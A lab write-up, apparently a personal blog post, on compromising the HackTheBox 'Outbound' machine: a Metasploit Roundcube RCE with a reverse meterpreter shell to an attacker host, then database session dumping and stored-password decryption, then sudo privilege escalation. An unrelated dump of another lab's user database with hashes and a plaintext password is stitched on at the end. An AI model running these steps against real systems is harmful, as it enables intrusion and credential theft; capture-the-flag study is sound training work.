---
layout: post
title: HackTheBox Outbound 
description: Easy-Rated HTB Machine
category: Labs
tags: linux privilege-escalation symlink webmail roundcube
image: assets/htb-outbound-preview.png
date: 2025-08-15 12:06 +0100
---
## TL;DR 


## Enumeration

### Nmap 

```bash 
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So we setup `/etc/hosts`

```bash 
echo 10.10.11.77 outbound.htb mail.outbound.htb
```

>Other enumeration/fuzzing didn't lead to anything, so we move on to the web app.
{: .prompt-warning }

## Foothold

Accessing with the given credential of `tyler` leads to a vulnerable version of `Roundcube Webmail 1.6.10` with `CVE‑2025‑49113`.

There is a metasploit exploit for this CVE :

```bash 
msf6 > search CVE‑2025‑49113                                                                                                               
[-] No results from search                                                                                                                 
msf6 > search exploit roundcube                                                                                                            
                                                                                                                                           
Matching Modules                                                                                                                           
================                                                                                                                           
                                                                                                                                           
   #  Name                                                  Disclosure Date  Rank       Check  Description                                 
   -  ----                                                  ---------------  ----       -----  -----------                                 
   0  exploit/multi/http/roundcube_auth_rce_cve_2025_49113  2025-06-02       excellent  Yes    Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Obj
ect Deserialization 

   <REDACTED>                                                                                                                                        
                                                                                                                                           
msf6 > use 0                                                                                                                               
[*] Using configured payload linux/x64/meterpreter/reverse_tcp


msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set LHOST 10.10.14.194                                                        
LHOST => 10.10.14.194                                                                                                                      
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set USERNAME tyler                                                            
USERNAME => tyler                                                                                                                          
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set PASSWORD LhKL1o9Nm3X2                                                     
PASSWORD => LhKL1o9Nm3X2                                                                                                                   
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > set RHOSTS mail.outbound.htb                                                        
RHOSTS => mail.outbound.htb                                                                                                                
msf6 exploit(multi/http/roundcube_auth_rce_cve_2025_49113) > run

<REDACTED>
meterpreter>
```

But the thing is we still don't have access with a user other than the `www-data` one. 


## Lateral Movement 


### Tyler User

Simply `su tyler` with the same password given as a foothold will land us a shell as `tyler`.

After gaining shell access through meterpreter, I looked for config files using: 

```bash 
find / -name *conf* 2>/dev/null | grep roundcube
``` 

And we get some config files with some interesting ones:

```bash
$config['db_dsnw'] = 'mysql://<REDACTED>:<PASS>@localhost/<REDACTED>';

<REDACTED>

$config['des_key'] = '<REDACTED>';

$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

```

Since the shell isn't interactive, we should dump anything with one command: 

```bash 
mysql -u roundcube -p<PASS> -h localhost roundcube -e 'use roundcube;select * from session;' -E                                    
```



``` 
*************************** 1. row ***************************                                                                     [0/1902]
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: <REDACTED>
*************************** 2. row ***************************
sess_id: c2r6gpikgg3rb5drcm62hr73sb
changed: 2025-08-15 09:41:37
     ip: 172.17.0.1
   vars: bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGVtcHxiOjE7cmVxdWVzdF90b2tlbnxzOjMyOiJRNkpncXhuUzdSenN0a1RMbVhTYTJwVGJPeTV2bXZJRCI7
*************************** 3. row ***************************
sess_id: dd6meghpbbic254m3jjm208jjv
changed: 2025-08-15 09:32:56
     ip: 172.17.0.1
   vars: <REDACTED>
```

Now decoding the vars from the first session we get: 
```bash 
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"<REDACTED>";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"<REDACTED>";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

### Jaccob User

The important fields are :
- `password` .
- `auth_secret` .

In [Here](https://www.roundcubeforum.net/index.php?topic=23399.0) we can find the way roundcube encrypts the database.

So using Cyberchef we can get the IV for the 3DES decryption, which is the first 8 bytes of the encrypted password (after decoding it with base64)
![Cyberchef1](assets/htb-outbound-3.png)

With the final result of :

![Cyberchef result](assets/htb-outbound-4.png)



>Note that the first 8 invalid characters are due to the recipe I put. I didn't remove the first 8 bytes, so you can remove them manually and login with:
`jacob:595mO8DmwGeD`
{: .prompt-warning }

595mO8DmwGeD

## User Flag

Simply `su` as `jacob` and we can read the Inbox mails with clear-text creds
```bash 
ssh jacob@10.10.11.77
```

>And we successfully get the User flag.
{: .prompt-tip }

## Privilege Escalation

```bash 
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Below is a resource monintoring tool, already mentionned in a mail, which we will try to exploit and gain higher privileges since we can run it as `sudo`.

```bash 
jacob@outbound:~$ sudo /usr/bin/below -h
Usage: below [OPTIONS] [COMMAND]

Commands:
  live      Display live system data (interactive) (default)
  record    Record local system data (daemon mode)
  replay    Replay historical data (interactive)
  debug     Debugging facilities (for development use)
  dump      Dump historical data into parseable text format
  snapshot  Create a historical snapshot file for a given time range
  help      Print this message or the help of the given subcommand(s)

Options:
      --config <CONFIG>  [default: /etc/below/below.conf]
  -d, --debug            
  -h, --help             Print help
```

Some searching leads to:
![](assets/htb-outbound-5.png)

And we confirm we're indeed vulnerable: 

![vuln](assets/htb-outbound-6.png)

Just search for anyt poc online, the exploit isn't hard. And we succesfully get the root flag. 

![Here](assets/htb-outbound-7.png)

>Rooted.
{: .prompt-tip }



```# ARTIFICAL

$ cat instance/users.db
EitablemodelmodelCREATE TABLE model (
        id VARCHAR(36) NOT NULL,
        filename VARCHAR(120) NOT NULL,
        user_id INTEGER NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id)
))=indexsqlite_autoindex_model_1model]tableuseruserCREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(100) NOT NULL,
        email VARCHAR(120) NOT NULL,
        password VARCHAR(200) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username),
        UNIQUE (email)
?K;index''Marti@arti.htbarti@arti.htb445365ad804c1afe78ad5a5f3bd1fa83'Mtesttest@test.com098f6bcd4621d373cade4e832627b4f69+Madminadmin@gmail.com92d7ddd2a010c59511dc2905b7e14f64</Mpruebaprueba@prueba.comc893bad68927b457dbed39460e6afd62<3Mmarymary@artificial.htbbf041041e57f1aff3be7ea1abd6129d0>5Mroyerroyer@artificial.htbbc25b1f80f544c0ab451c02a3dca9fc6@7Mrobertrobert@artificial.htbb606c5f5136170f15444251665638b36<3Mmarkmark@artificial.htb0f3d8c76530022670f1c6029eed09ccb<3Mgaelgael@artificial.htbc99175974b6e192936d97224638a34f8
        'arti@arti.htb test     admin
pruebmary       royer
robermark       gael
        8\8pJ'arti@arti.htb     'test@test.co+admin@gmail.com/prueba@prueba.com3mary@artificial.htb5royer@artificial.htb7robert@artificial.htb3mark@artificial.htb3  g\\l@artificial.htb

RPU[e6312879-2340-4ee1-bf6a-6508327ff245e6312879-2340-4ee1-bf6a-6508327ff245.h5 R
)(Ue6312879-2340-4ee1-bf6a-6508327ff245($









gael:mattp005numbertwo```
